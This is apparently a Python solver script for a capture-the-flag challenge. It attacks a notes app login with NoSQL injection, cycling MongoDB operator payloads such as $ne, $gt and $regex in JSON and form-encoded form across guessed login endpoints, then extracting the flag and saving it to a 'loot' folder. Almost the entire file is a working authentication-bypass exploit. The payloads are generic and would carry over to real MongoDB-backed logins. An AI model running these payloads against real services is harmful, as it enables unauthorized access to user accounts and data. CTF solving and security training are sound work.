#!/usr/bin/env python3 -I
"""
No Structure Required (POCTF 2026, ID=78) solver.
NoSQL injection on a notes app login.

Usage: python3 -I solve_nosqli.py <base_url> <session_cookie>
Example: python3 -I solve_nosqli.py https://pointeroverflowctf.com/challenges/no-structure-required/notes-app .eJx...
"""
import sys
import json
import pathlib
import urllib.request
import urllib.parse
import urllib.error


def try_nosqli(base_url, session_cookie):
    payloads = [
        {"username": {"$ne": ""}, "password": {"$ne": ""}},
        {"username": {"$gt": ""}, "password": {"$gt": ""}},
        {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
        {"username": {"$ne": "nonexistent"}, "password": {"$ne": "nonexistent"}},
        {"username": {"$exists": True}, "password": {"$exists": True}},
        {"username": "admin", "password": {"$ne": ""}},
        {"username": "admin", "password": {"$gt": ""}},
        {"username": {"$regex": "^a"}, "password": {"$ne": ""}},
    ]

    login_endpoints = [
        f"{base_url}/login",
        f"{base_url}/api/login",
        f"{base_url}/auth",
        f"{base_url}",
    ]

    for endpoint in login_endpoints:
        for i, payload in enumerate(payloads):
            print(f"\n[*] Endpoint: {endpoint}")
            print(f"[*] Payload #{i}: {json.dumps(payload)}")

            data = json.dumps(payload).encode('utf-8')
            req = urllib.request.Request(
                endpoint,
                data=data,
                method='POST'
            )
            req.add_header("Content-Type", "application/json")
            req.add_header("Cookie", f"session={session_cookie}")

            try:
                resp = urllib.request.urlopen(req, timeout=10)
                body = resp.read().decode('utf-8', errors='replace')
                status = resp.getcode()
                print(f"[*] Status: {status}")
                print(f"[*] Response (first 500): {body[:500]}")

                if "POCTF{" in body:
                    start = body.index("POCTF{")
                    end = body.index("}", start) + 1
                    flag = body[start:end]
                    print(f"\n[+] FLAG FOUND: {flag}")
                    return flag

            except urllib.error.HTTPError as e:
                body = e.read().decode('utf-8', errors='replace')
                print(f"[*] HTTP {e.code}: {body[:300]}")
                if "POCTF{" in body:
                    start = body.index("POCTF{")
                    end = body.index("}", start) + 1
                    flag = body[start:end]
                    print(f"\n[+] FLAG FOUND: {flag}")
                    return flag
            except Exception as e:
                print(f"[!] Error: {e}")

    # Also try form-encoded POST
    print("\n[*] Trying form-encoded payloads...")
    form_payloads = [
        {"username[$ne]": "", "password[$ne]": ""},
        {"username[$gt]": "", "password[$gt]": ""},
        {"username": "admin", "password[$ne]": ""},
    ]

    for endpoint in login_endpoints:
        for i, payload in enumerate(form_payloads):
            data = urllib.parse.urlencode(payload).encode('utf-8')
            req = urllib.request.Request(endpoint, data=data, method='POST')
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            req.add_header("Cookie", f"session={session_cookie}")

            try:
                resp = urllib.request.urlopen(req, timeout=10)
                body = resp.read().decode('utf-8', errors='replace')
                print(f"[*] Form payload #{i} -> {resp.getcode()}: {body[:300]}")
                if "POCTF{" in body:
                    start = body.index("POCTF{")
                    end = body.index("}", start) + 1
                    return body[start:end]
            except urllib.error.HTTPError as e:
                body = e.read().decode('utf-8', errors='replace')
                if "POCTF{" in body:
                    start = body.index("POCTF{")
                    end = body.index("}", start) + 1
                    return body[start:end]
            except Exception:
                pass

    return None


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 -I solve_nosqli.py <base_url> <session_cookie>")
        sys.exit(1)

    base_url = sys.argv[1].rstrip('/')
    cookie = sys.argv[2]
    flag = try_nosqli(base_url, cookie)

    if flag:
        outdir = pathlib.Path(__file__).parent.parent / "loot"
        outdir.mkdir(exist_ok=True)
        (outdir / "flag.txt").write_text(flag + "\n")
        print(f"\n[+] Saved to loot/flag.txt: {flag}")
    else:
        print("\n[!] No flag found. Verify session cookie and endpoint URL.")
